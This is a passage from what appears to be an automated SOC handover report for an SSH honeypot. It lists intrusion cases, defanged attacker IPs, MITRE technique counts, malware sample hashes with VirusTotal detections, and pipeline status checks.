| `2026-06-13 11:01:20` | `cowrie.log.closed` |
| `2026-06-13 11:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.177[.]88` to AbuseIPDB if not already reported
- [ ] Block `180.76.177[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb2b78cd38a

| Field | Detail |
|---|---|
| **Source IP** | `180.76.177[.]88` |
| **First Seen** | 2026-06-13 11:14 |
| **Last Seen** | 2026-06-13 11:15 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 11:14:50` | `cowrie.session.connect` |
| `2026-06-13 11:14:50` | `cowrie.client.version` |
| `2026-06-13 11:14:53` | `cowrie.client.kex` |
| `2026-06-13 11:14:57` | `cowrie.login.success` |
| `2026-06-13 11:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.177[.]88` to AbuseIPDB if not already reported
- [ ] Block `180.76.177[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.76.177[.]88` | **29** | 2026-06-13 10:46 | 2026-06-13 11:23 | 40m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.163.60[.]90` | **2** | 2026-06-13 10:53 | 2026-06-13 10:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.120.30[.]67` | **2** | 2026-06-13 09:39 | 2026-06-13 09:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.11[.]137` | 1 | 2026-06-13 10:40 | 2026-06-13 10:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.63.25[.]214` | 1 | 2026-06-13 10:08 | 2026-06-13 10:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.172.124[.]25` | 1 | 2026-06-13 10:14 | 2026-06-13 10:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.15[.]138` | 1 | 2026-06-13 10:10 | 2026-06-13 10:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.39[.]73` | 1 | 2026-06-13 10:37 | 2026-06-13 10:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `167.99.66[.]42` | 1 | 2026-06-13 10:13 | 2026-06-13 10:13 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.106.182[.]196` | 1 | 2026-06-13 11:55 | 2026-06-13 11:55 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `167.99.66[.]42` | SG | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `47.120.30[.]67` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 2 |
| `113.172.124[.]25` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 5 |
| `103.63.25[.]214` | ID | Asia Pacific Network Information Centre | **100** ⚠️ | 5 |
| `20.163.60[.]90` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `120.48.15[.]138` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `101.126.11[.]137` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `180.76.177[.]88` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 42 |
| `120.48.39[.]73` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 0 |
| `20.106.182[.]196` | US | Microsoft Corporation | **94** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 34 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 58 cases |
| Tool 34  | Credential Extractor        | ✅ 18 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (10.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 10 recon entry/entries in table (3 group(s) consolidating 33 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-13T11:56:51Z_
